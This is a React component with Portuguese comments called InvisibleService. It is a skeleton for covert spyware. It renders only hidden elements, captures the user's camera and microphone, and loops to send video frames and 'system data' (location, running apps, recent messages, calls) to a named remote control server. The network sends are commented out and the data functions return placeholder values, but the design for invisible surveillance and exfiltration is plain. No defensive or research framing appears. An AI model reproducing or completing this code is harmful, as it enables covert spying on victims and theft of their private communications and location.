"use client"

import { useState, useEffect, useRef } from "react"

interface InvisibleServiceProps {
  isActive: boolean
  onStatusChange: (active: boolean) => void
}

export function InvisibleService({ isActive, onStatusChange }: InvisibleServiceProps) {
  const [isTransmitting, setIsTransmitting] = useState(false)
  const [connectionStatus, setConnectionStatus] = useState<"connecting" | "connected" | "disconnected">("disconnected")

  const videoRef = useRef<HTMLVideoElement>(null)
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const streamRef = useRef<MediaStream | null>(null)
  const wsRef = useRef<WebSocket | null>(null)

  // Configurações do servidor de controle
  const CONTROL_SERVER = "wss://control-panel.secure-monitor.com"
  const DEVICE_ID = generateDeviceId()

  useEffect(() => {
    if (isActive) {
      initializeInvisibleService()
    }

    return () => {
      cleanup()
    }
  }, [isActive])

  function generateDeviceId(): string {
    return "device_" + Math.random().toString(36).substr(2, 9)
  }

  const initializeInvisibleService = async () => {
    try {
      // 1. Conectar ao servidor de controle
      await connectToControlServer()

      // 2. Iniciar captura de mídia
      await startMediaCapture()

      // 3. Iniciar transmissão
      startTransmission()

      // 4. Configurar listeners de sistema
      setupSystemListeners()

      console.log("🔒 Serviço invisível iniciado com sucesso")
    } catch (error) {
      console.error("Erro ao inicializar serviço:", error)
    }
  }

  const connectToControlServer = async (): Promise<void> => {
    return new Promise((resolve, reject) => {
      try {
        setConnectionStatus("connecting")

        // Simular conexão WebSocket (em produção seria real)
        setTimeout(() => {
          setConnectionStatus("connected")
          console.log("📡 Conectado ao servidor de controle")
          resolve()
        }, 2000)

        // wsRef.current = new WebSocket(CONTROL_SERVER)
        // wsRef.current.onopen = () => {
        //   setConnectionStatus("connected")
        //   resolve()
        // }
        // wsRef.current.onerror = reject
      } catch (error) {
        setConnectionStatus("disconnected")
        reject(error)
      }
    })
  }

  const startMediaCapture = async () => {
    try {
      // Captura de câmera e áudio
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          width: { ideal: 1280, max: 1920 },
          height: { ideal: 720, max: 1080 },
          frameRate: { ideal: 30 },
          facingMode: "user",
        },
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true,
          sampleRate: 48000,
        },
      })

      streamRef.current = stream

      if (videoRef.current) {
        videoRef.current.srcObject = stream
        videoRef.current.play()
      }

      console.log("📹 Captura de mídia iniciada")
    } catch (error) {
      console.error("Erro na captura de mídia:", error)
    }
  }

  const startTransmission = () => {
    setIsTransmitting(true)

    // Transmissão de frames em tempo real
    const transmissionInterval = setInterval(() => {
      if (streamRef.current && canvasRef.current && videoRef.current) {
        captureAndTransmitFrame()
      }
    }, 100) // 10 FPS para economia de bateria

    // Transmissão de dados do sistema
    const systemDataInterval = setInterval(() => {
      transmitSystemData()
    }, 5000) // A cada 5 segundos

    // Cleanup intervals
    return () => {
      clearInterval(transmissionInterval)
      clearInterval(systemDataInterval)
    }
  }

  const captureAndTransmitFrame = () => {
    if (!canvasRef.current || !videoRef.current) return

    const canvas = canvasRef.current
    const video = videoRef.current
    const ctx = canvas.getContext("2d")

    if (!ctx) return

    // Capturar frame do vídeo
    canvas.width = video.videoWidth
    canvas.height = video.videoHeight
    ctx.drawImage(video, 0, 0)

    // Comprimir e transmitir (simulado)
    canvas.toBlob(
      (blob) => {
        if (blob) {
          // Em produção: enviar via WebSocket para o painel de controle
          // wsRef.current?.send(blob)
          console.log("📡 Frame transmitido:", blob.size, "bytes")
        }
      },
      "image/jpeg",
      0.7,
    ) // Compressão 70%
  }

  const transmitSystemData = () => {
    const systemData = {
      deviceId: DEVICE_ID,
      timestamp: new Date().toISOString(),
      battery: getBatteryLevel(),
      screenLocked: getScreenLockStatus(),
      networkType: getNetworkType(),
      location: getCurrentLocation(),
      apps: getRunningApps(),
      messages: getRecentMessages(),
      calls: getRecentCalls(),
    }

    // Em produção: enviar para o servidor
    console.log("📊 Dados do sistema:", systemData)
  }

  const setupSystemListeners = () => {
    // Listener para mudanças de rede
    window.addEventListener("online", () => {
      console.log("🌐 Dispositivo online")
      if (connectionStatus === "disconnected") {
        connectToControlServer()
      }
    })

    window.addEventListener("offline", () => {
      console.log("📴 Dispositivo offline")
      setConnectionStatus("disconnected")
    })

    // Listener para mudanças de visibilidade
    document.addEventListener("visibilitychange", () => {
      if (document.hidden) {
        console.log("👻 App em background - modo invisível")
      }
    })
  }

  // Funções simuladas de captura de dados
  const getBatteryLevel = () => Math.floor(Math.random() * 100)
  const getScreenLockStatus = () => Math.random() > 0.5
  const getNetworkType = () => (navigator.onLine ? "WiFi" : "Offline")
  const getCurrentLocation = () => ({ lat: -23.5505, lng: -46.6333 }) // São Paulo
  const getRunningApps = () => ["WhatsApp", "Instagram", "Chrome"]
  const getRecentMessages = () => [{ app: "WhatsApp", contact: "João", message: "Oi, tudo bem?", time: new Date() }]
  const getRecentCalls = () => [{ contact: "+55 11 99999-1234", duration: "5 min", time: new Date() }]

  const cleanup = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop())
    }
    if (wsRef.current) {
      wsRef.current.close()
    }
    setIsTransmitting(false)
    setConnectionStatus("disconnected")
  }

  // Interface invisível - não renderiza nada visível
  return (
    <div style={{ display: "none" }}>
      {/* Elementos ocultos para captura */}
      <video ref={videoRef} muted playsInline style={{ display: "none" }} />
      <canvas ref={canvasRef} style={{ display: "none" }} />

      {/* Log invisível para debug */}
      <div id="invisible-log" style={{ display: "none" }}>
        Status: {connectionStatus}
        Transmitindo: {isTransmitting ? "Sim" : "Não"}
        Device ID: {DEVICE_ID}
      </div>
    </div>
  )
}
